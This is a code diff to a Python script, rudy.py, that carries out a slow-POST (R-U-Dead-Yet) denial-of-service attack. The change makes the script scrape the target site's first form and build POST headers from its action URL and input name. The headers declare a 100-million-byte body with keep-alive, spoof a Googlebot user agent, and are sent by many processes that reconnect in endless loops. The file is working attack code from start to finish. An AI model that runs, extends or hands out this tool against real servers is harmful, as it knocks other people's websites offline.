@@ -1,28 +1,59 @@
 #-*- coding:utf-8 -*-
-import socket,multiprocessing,sys,random,argparse
-def usage():
-    print "Usage:\nrudy.py <TARGET> <PORT> <CONNECTIONS> <USER-AGENT>\nOptional: <USER-AGENT> Text file with user agents\nError: Missing arguments"
-    sys.exit(0)
+import socket,multiprocessing,sys,random,argparse,requests
+from BeautifulSoup import BeautifulSoup
 
-def set_header(targett,user_agent):
+def form_to_dict(form):
+    form_dict = {
+        'action' : form.get('action', ''),
+        'inputs' : [],
+    }
+
+    for index, input_field in enumerate(form.findAll('input')):
+
+        form_dict['inputs'].append({
+            'name' : input_field.get('name', ''),
+            'type' : input_field.get('type', ''),
+        })
+    return form_dict
+
+def treat_response():
+    response = requests.get(args.target)
+    soup = BeautifulSoup(response.text)
+    for form in soup.findAll('form'):
+        forms = form_to_dict(form)
+        break
+    inputs = forms['inputs'][0]
+    action_form = forms['action']
+    name_input = inputs['name']
+    inputs_to_use = []
+    inputs_to_use.append(action_form)
+    inputs_to_use.append(name_input)
+    return inputs_to_use
+
+def set_header(targett,user_agent,inputs):
     if user_agent is not None:
         agents = []
         with open(user_agent, 'rb') as ra:
             agents += ra.read().split('\n')
             ra.close()
 
-        header = "POST index.php HTTP/1.1\r\nContent-Length: 100000000\r\nHost: {}\r\nKeep-Alive: 99999999\r\nConnection: keep-alive\r\nUser-Agent: {}".format(targett,random.choice(agents))
-        print header
+        header = "POST {} HTTP/1.1\r\nContent-Length: 100000000\r\nHost: {}\r\nKeep-Alive: 99999999\r\nConnection: keep-alive\r\nUser-Agent: {}\r\n%s=\r\n".format(inputs[0],targett,random.choice(agents),inputs[1])
         return header
     else:
-        header = "POST index.php HTTP/1.1\r\nContent-Length: 100000000\r\nHost: {}\r\nKeep-Alive: 99999999\r\nConnection: keep-alive\r\nUser-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\r\n".format(targett)
+        header = "POST {} HTTP/1.1\r\nContent-Length: 100000000\r\nHost: {}\r\nKeep-Alive: 99999999\r\nConnection: keep-alive\r\nUser-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\r\n%s=".format(inputs[0],targett,inputs[1])
         return header
 
 def attack(targett,port,header):
     while True:
             sock = socket.socket()
             try:
-                sock.connect((targett, port))
+                if 'http://' in targett:
+                    targett.replace('http://','')
+                elif 'https://' in targett:
+                    targett.replace('https://','')
+                else:
+                    pass
+                sock.connect((targett,port))
                 if sock:
                     print 'connected\n'
                     sock.send(header)
@@ -50,7 +81,7 @@ if __name__ == '__main__':
     arguments()
     try:
         for i in range(args.connections):
-            attack_process = multiprocessing.Process(target=attack, args=(args.target,args.port,set_header(args.target,args.useragent)))
+            attack_process = multiprocessing.Process(target=attack, args=(args.target,args.port,set_header(args.target,args.useragent,treat_response())))
             attack_process.start()
             conections.append(attack_process)
         for c in conections:
